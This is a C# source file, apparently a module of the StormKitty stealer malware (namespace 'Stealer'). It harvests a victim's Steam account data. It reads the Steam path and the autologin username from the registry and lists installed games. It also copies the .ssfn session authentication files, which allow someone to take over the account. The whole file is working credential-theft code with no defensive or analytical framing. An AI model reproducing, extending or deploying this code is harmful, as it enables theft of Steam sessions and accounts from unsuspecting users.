/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using Microsoft.Win32;

namespace Stealer
{
    internal sealed class Steam
    {
            
        public static bool GetSteamSession(string sSavePath)
        {
            try
            {
                RegistryKey rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
                if (rkSteam == null)
                    return false;

                string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
                if (!Directory.Exists(sSteamPath))
                    return false;

                Directory.CreateDirectory(sSavePath);
                // Get steam applications list
                foreach (string GameID in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
                {
                    using (RegistryKey app = rkSteam.OpenSubKey("Apps\\" + GameID))
                    {
                        string Name = (string)app.GetValue("Name");
                        Name = string.IsNullOrEmpty(Name) ? "Unknown" : Name;
                        string Installed = (int)app.GetValue("Installed") == 1 ? "Yes" : "No";
                        string Running = (int)app.GetValue("Running") == 1 ? "Yes" : "No";
                        string Updating = (int)app.GetValue("Updating") == 1 ? "Yes" : "No";

                        File.AppendAllText(sSavePath + "\\Apps.txt",
                            $"Application {Name}\n\tGameID: {GameID}\n\tInstalled: {Installed}\n\tRunning: {Running}\n\tUpdating: {Updating}\n\n");
                    }
                }

                // Copy .ssfn flags
                foreach (string sFile in Directory.GetFiles(sSteamPath))
                    if (sFile.Contains("ssfn"))
                        File.Copy(sFile, sSavePath + "\\" + Path.GetFileName(sFile));
                
                Counter.Steam = true;

                string RememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                string sSteamInfo = String.Format(
                    "\nAutologin User: " + rkSteam.GetValue("AutoLoginUser") +
                    "\nRemember password: " + RememberPassword
                    );
                File.WriteAllText(sSavePath + "\\SteamInfo.txt", sSteamInfo);
                
                return true;
            }
            catch { return false; }
        }
    }
}
